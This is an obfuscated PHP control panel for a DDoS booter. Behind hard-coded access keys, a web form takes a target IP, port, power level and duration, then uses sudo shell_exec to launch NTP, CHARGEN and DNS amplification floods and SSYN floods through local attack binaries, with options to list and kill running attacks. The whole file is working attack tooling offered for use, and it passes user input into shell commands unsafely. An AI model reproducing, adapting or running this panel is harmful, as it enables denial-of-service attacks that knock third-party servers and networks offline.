<?php
$
{
	
	"GLOBALS"
	
}


["qnxjphcq"] = "time";
$
{
	
	"GLOBALS"
	
}


["ymkeunv"] = "port";
$
{
	
	"GLOBALS"
	
}


["utrwlwvce"] = "output";
$
{
	
	"GLOBALS"
	
}


["fcltvl"] = "i";
$
{
	
	"GLOBALS"
	
}


["jvvexbfkhn"] = "attacks";
$
{
	
	"GLOBALS"
	
}


["pyufomv"] = "threads";
$
{
	
	"GLOBALS"
	
}


["ptqumdfj"] = "pps";
$
{
	
	"GLOBALS"
	
}


["tdvlplqrq"] = "conc";
$
{
	
	"GLOBALS"
	
}


["yofqnkklins"] = "key";

if ($_GET["key"] == "killuminati7")
{
	
	$
	{
		
		"GLOBALS"
		
	}
	
	
	["wohpvpn"] = "conc";
	$
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["yofqnkklins"]
		
	}
	= "Phen";
	$
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["wohpvpn"]
		
	}
	= 10;
	
}

elseif ($_GET["key"] == "globalBHkey123")
{
	
	$
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["yofqnkklins"]
		
	}
	= "BH";
	$
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["tdvlplqrq"]
		
	}
	= 30;
	
}

else die("Wrong key.");
echo "\n\t&lt;body bgcolor="

// EFEFEF"&gt; \n\t&lt;h1&gt;<strong> Control Pannel</strong>&lt;/h1&gt;\n\t&lt;form action="" method="POST"&gt;\n\tIP: &lt;input name="ip" value=\"";

echo $_GET["host"];
echo "\" size=\"16\" style=\"border-style: dotted ;
border-color: coral;
background-color: cornsilk ;
" / &gt; ntPort: &lt; inputname = "port"value = "";
echo $_GET["port"];
$emtybnirjt = "attacks";
echo "\" size="6" style=\"border-style: dotted ;
border-color: coral;
background-color: cornsilk ;
\"/&gt;\n\tPower(1-3): &lt;input name="power" value=\""size = "6"style = "border-style: dotted ;
border-color: coral;
background-color: cornsilk ;
\"/&gt;\n\tTime: &lt;input name=\"time\" value=\"";
echo $_GET["time"];
echo ""size = "5"style = "border-style: dotted ;
border-color: coral;
background-color: cornsilk ;
" / &gt; &amp; nbsp;
nt &lt; inputname = "sendDNS\" type=\"submit\" value="SendDNS" style=\"font-family: Tahoma;
color: white;
border-style: inset ;
border-color: white;
background-color: #a0ce00 ;
" / &gt; n &lt; !-- &lt; inputname = "sendChar\" type=\"submit\" value="SendChargen" style="font - family:
Tahoma;
color:
white;
border - style:
inset;
border - color:
white;
background - color: //a0ce00 ;
"/&gt;\n\t&lt;input name=\"sendNTP\" type="submit" value=\"Send NTP"style = "font-family: Tahoma;
color: white;
border-style: inset ;
border-color: white;
background-color: #a0ce00 ;
\"/&gt;\n\t&lt;input name="sendSSYN" type=\"submit\" value=\"Send SSYN\" style=\"font-family: Tahoma;
color: white;
border-style: inset ;
border-color: white;
background-color: #a0ce00 ;
" / &gt; -- &gt; nt - &lt; inputname = "killSpec\" type=\"submit"value = "Kill Specific"style = "font-family: Tahoma;
color: white;
border-style: inset ;
border-color: white;
background-color: #FF6666;
" / &gt; nt &lt; inputname = "killAll\" type=\"submit\" value=\"Kill All\" style=\"font-family: Tahoma;
color: white;
border-style: inset ;
border-color: white;
background-color: #FF6666;
\"/&gt;\n\t&lt;/form&gt;\n\t<br>\n\n";
if (isset($_POST["killAll"]) OR $_GET["method"] == "ka")
{
	
	$_GET["method"] = "ka";
	
}

else
{
	
	if (isset($_POST["killSpec"]) ORisset($_POST["sendChar"]) 
ORisset($_POST["sendNTP"]) ORisset($_POST["sendSSYN"]) 
ORisset($_POST["sendDNS"]))
	{
		
		$_GET["host"] = $_POST["ip"];
		$_GET["time"] = $_POST["time"];
		$_GET["port"] = $_POST["port"];
		$_GET["power"] = $_POST["power"];
		if (isset($_POST["killSpec"]))
		{
			
			$_GET["method"] = "ks";
			
		}
		
		elseif (isset($_POST["sendChar"]))
		{
			
			$_GET["method"] = "char";
			
		}
		
		elseif (isset($_POST["sendNTP"]))
		{
			
			$_GET["method"] = "ntp";
			
		}
		
		elseif (isset($_POST["sendSSYN"]))
		{
			
			$_GET["method"] = "ssyn";
			
		}
		
		elseif (isset($_POST["sendDNS"]))
		{
			
			$_GET["method"] = "dns";
			
		}
		
		
	}
	
	
	if (isset($_GET["method"]))
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["mcmcvulw"] = "port";
		$
		{
			
			$
			{
				
				"GLOBALS"
				
			}
			
			
			["mcmcvulw"]
			
		}
		= (int)$_GET["port"] != 80 &amp;&amp; (int)$_GET["port"] &gt; 0 
&amp;&amp; (int)$_GET["port"] &lt; 65536 ? (int)$_GET["port"] : 5223;
		$host = preg_match("/^[a-zA-Z0-9\\.-_]+\$/", $_GET["host"]) ? 
$_GET["host"] : 0;
		$mkmzhc = "time";
		if ($_GET["host"] == 0) die("Enter correct IP please.");
		$
		{
			
			$mkmzhc
			
		}
		= (int)$_GET["time"] &gt; 0 &amp;&amp; (int)$_GET["time"] &lt; 80001 ?
 (int)$_GET["time"] : 80000;
		if (isset($_GET["power"]))
		{
			
			$tqpphbs = "pps";
			$
			{
				
				"GLOBALS"
				
			}
			
			
			["ezccffewz"] = "time";
			$pvnunbiy = "pps";
			$
			{
				
				"GLOBALS"
				
			}
			
			
			["xntvwavhbej"] = "threads";
			switch ((int)$_GET["power"])
			{
				
				default:
				$
				{
					
					$tqpphbs
					
				}
				= 10000;
				$
				{
					
					$
					{
						
						"GLOBALS"
						
					}
					
					
					["xntvwavhbej"]
					
				}
				= 1;
				break;
				
				case 2:
				$
				{
					
					$
					{
						
						"GLOBALS"
						
					}
					
					
					["ptqumdfj"]
					
				}
				= 60000;
				$
				{
					
					$
					{
						
						"GLOBALS"
						
					}
					
					
					["pyufomv"]
					
				}
				= 3;
				break;
				
				case 3:
				$
				{
					
					$pvnunbiy
					
				}
				= - 1;
				$
				{
					
					$
					{
						
						"GLOBALS"
						
					}
					
					
					["pyufomv"]
					
				}
				= 8;
				$
				{
					
					$
					{
						
						"GLOBALS"
						
					}
					
					
					["ezccffewz"]
					
				}
				= (int)$_GET["time"] &gt; 0 &amp;&amp; (int)$_GET["time"] &lt; 3601 ?
 (int)$_GET["time"] : 3600;
				break;
				
			}
			
			
		}
		
		else
		{
			
			$
			{
				
				$
				{
					
					"GLOBALS"
					
				}
				
				
				["ptqumdfj"]
				
			}
			= 18000;
			$twxtiakhcgy = "threads";
			$
			{
				
				$twxtiakhcgy
				
			}
			= 1;
			
		}
		
		
	}
	
	
}


$
{
	
	$emtybnirjt
	
}
= shell_exec("sudo pgrep -f $key | wc -l") - 2;
echo "Before: " . $
{
	
	$
	{
		
		"GLOBALS"
		
	}
	
	
	["jvvexbfkhn"]
	
}
;
/************************************************************\
*
\************************************************************/
function conc($a, $i)
{
	
	$
	{
		
		"GLOBALS"
		
	}
	
	
	["gjvlqtxguh"] = "a";
	if ($
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["gjvlqtxguh"]
		
	}
	&gt;= $
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["fcltvl"]
		
	}
	)
	{
		
		echo "&lt;h1&gt;" . $
		{
			
			$
			{
				
				"GLOBALS"
				
			}
			
			
			["fcltvl"]
			
		}
		. " attacks running already!&lt;/h1&gt;&lt;h2&gt;Stop running attacks 
or wait until they are over.&lt;/h2&gt;";
		die();
		
	}
	
	
}


if ($_GET["method"] == "NTP" || $_GET["method"] == "ntp")
{
	
	$
	{
		
		"GLOBALS"
		
	}
	
	
	["muxlfvtesose"] = "conc";
	conc($
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["jvvexbfkhn"]
		
	}
	
	
	, $
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["muxlfvtesose"]
		
	}
	);
	$
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["utrwlwvce"]
		
	}
	= shell_exec("sudo screen -d -m -S $key ./ntpattack $host $port 
lolmerged.txt $threads $pps $time");
	echo "&lt;h1&gt;NTP attack sent to " . $host . ":" . $
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["ymkeunv"]
		
	}
	. " for " . $
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["qnxjphcq"]
		
	}
	. " seconds.&lt;/h1&gt;";
	
}

elseif ($_GET["method"] == "char" || $_GET["method"] == "CHAR")
{
	
	$efdiwhlc = "conc";
	$imyedjqgenm = "attacks";
	conc($
	{
		
		$imyedjqgenm
		
	}
	
	
	, $
	{
		
		$efdiwhlc
		
	}
	);
	$
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["utrwlwvce"]
		
	}
	= shell_exec("sudo screen -d -m -S $key ./c $host $port c.txt $threads 
$pps $time");
	echo "&lt;h1&gt;CHARGEN attack sent to " . $host . ":" . $
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["ymkeunv"]
		
	}
	. " for " . $
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["qnxjphcq"]
		
	}
	. " seconds.&lt;/h1&gt;<br>";
	
}

elseif ($_GET["method"] == "dns" || $_GET["method"] == "DNS")
{
	
	$
	{
		
		"GLOBALS"
		
	}
	
	
	["yfpgpo"] = "conc";
	conc($
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["jvvexbfkhn"]
		
	}
	
	
	, $
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["yfpgpo"]
		
	}
	);
	$
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["utrwlwvce"]
		
	}
	= shell_exec("sudo screen -d -m -S $key ./50x $host $port dns.txt $threads $time");
	echo "&lt;h1&gt;DNS attack sent to " . $host . ":" . $
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["ymkeunv"]
		
	}
	. " for " . $
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["qnxjphcq"]
		
	}
	. " seconds.&lt;/h1&gt;<br>";
	
}

elseif ($_GET["method"] == "ssyn" || $_GET["method"] == "SSYN")
{
	
	$
	{
		
		"GLOBALS"
		
	}
	
	
	["ikkotpcy"] = "attacks";
	conc($
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["ikkotpcy"]
		
	}
	
	
	, $
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["tdvlplqrq"]
		
	}
	);
	$yrtpalint = "port";
	$djwvpqdqil = "time";
	$
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["utrwlwvce"]
		
	}
	= shell_exec("sudo screen -d -m -S $key ./ssyn $host $port $threads $pps $time");
	echo "&lt;h1&gt;SSYN attack sent to " . $host . ":" . $
	{
		
		$yrtpalint
		
	}
	. " for " . $
	{
		
		$djwvpqdqil
		
	}
	. " seconds.&lt;/h1&gt;<br>";
	
}

elseif ($_GET["method"] == "ka" || $_GET["method"] == "KA")
{
	
	$
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["utrwlwvce"]
		
	}
	= shell_exec("sudo pkill -f $key");
	echo "&lt;h1&gt;All running attacks killed.&lt;/h1&gt;";
	
}

elseif ($_GET["method"] == "ks" || $_GET["method"] == "KS")
{
	
	$
	{
		
		"GLOBALS"
		
	}
	
	
	["srmdvy"] = "output";
	$
	{
		
		$
		{
			
			"GLOBALS"
			
		}
		
		
		["srmdvy"]
		
	}
	= shell_exec("sudo pkill -f $host");
	echo "&lt;h1&gt;Running attacks on " . $host . " killed.&lt;/h1&gt;";
	
}


$
{
	
	$
	{
		
		"GLOBALS"
		
	}
	
	
	["jvvexbfkhn"]
	
}
= shell_exec("sudo pgrep -f $key | wc -l") - 2;
echo "<br>Now: " . $
{
	
	$
	{
		
		"GLOBALS"
		
	}
	
	
	["jvvexbfkhn"]
	
}
;
